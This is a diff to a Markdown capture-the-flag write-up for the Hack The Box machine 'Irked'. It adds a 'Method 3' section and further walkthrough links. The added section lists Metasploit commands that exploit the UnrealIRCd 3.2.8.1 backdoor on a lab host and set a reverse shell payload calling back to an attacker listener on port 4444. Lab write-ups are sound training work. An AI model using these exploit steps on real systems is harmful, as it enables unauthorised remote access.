@@ -137,6 +137,19 @@ export SHELL=bash
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/591f1bad-ad38-45d0-b1fa-b39b769700d5)
 
+### Method 3
++ `msfconsole -q`
++ `use exploit/unix/irc/unreal_ircd_3281_backdoor`
++ `set RHOSTS 10.10.10.117`
++ `set RPORT 8067`
++ `show payloads`
++ `set PAYLOAD cmd/unix/reverse`
++ `set LHOST 10.10.14.6`
++ `set LPORT 4444`
++ `exploit`
+
+
+
 
 ## Privilege Escalation: from 'ircd' to 'djmardov'
 + **Alternatively**, you can skip this step, and continue directly with root privilege escalation step [Privilege Escalation: from 'djmardov' to 'root'](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/16_Irked.md#privilege-escalation-from-djmardov-to-root). It's up to you.
@@ -188,4 +201,8 @@ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/irked-writeup-w-o-metasploit
 + https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/irked
 + https://medium.com/@Inching-Towards-Intelligence/htb-irked-50-100-ff10595be50d
-
++ https://www.hackingarticles.in/hack-the-box-irked-walkthrough/
++ https://0xrick.github.io/hack-the-box/irked/
++ https://steflan-security.com/hack-the-box-irked-walkthrough/
++ https://gianrathgeb.github.io/hackthebox/writeup/linux/irked/
++ https://www.siberportal.org/red-team/penetration-testing/hack-the-box-irked-cozumu/
